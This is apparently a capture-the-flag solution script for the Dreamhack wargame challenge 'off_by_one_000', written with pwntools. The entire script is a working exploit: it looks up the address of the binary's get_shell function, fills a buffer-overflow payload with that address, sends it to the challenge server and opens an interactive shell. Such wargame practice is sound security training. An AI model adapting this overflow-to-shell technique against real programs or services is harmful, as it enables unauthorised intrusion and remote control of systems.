from pwn import *

p = remote("host1.dreamhack.games", 24232)
e = ELF("./off_by_one_000")

getshell = e.symbols['get_shell']
print(f"get_shell() address : {hex(getshell)}")

payload = p32(getshell) * int(0x256 / 0x4)

p.sendline(payload)
p.interactive()